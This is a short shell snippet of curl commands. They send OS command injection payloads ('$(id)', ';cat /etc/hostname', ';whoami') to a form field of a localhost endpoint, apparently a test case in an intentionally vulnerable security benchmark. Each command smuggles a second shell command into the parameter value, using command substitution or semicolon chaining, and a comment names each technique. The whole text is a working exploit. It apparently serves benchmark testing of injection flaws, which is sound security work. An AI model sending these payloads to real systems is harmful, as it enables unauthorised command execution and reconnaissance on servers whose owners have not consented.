# Execute arbitrary commands via OS command injection
curl -s -X POST 'http://127.0.0.1:8443/benchmark/cmdi-00/BenchmarkTest00268' \
  -d 'BenchmarkTest00268=$(id)'   # Command substitution syntax

# Alternate payloads:
curl -s -X POST 'http://127.0.0.1:8443/benchmark/cmdi-00/BenchmarkTest00268' \
  -d 'BenchmarkTest00268=;cat /etc/hostname'   # Semicolon chaining

curl -s -X POST 'http://127.0.0.1:8443/benchmark/cmdi-00/BenchmarkTest00268' \
  -d 'BenchmarkTest00268=;whoami'   # Simple command injection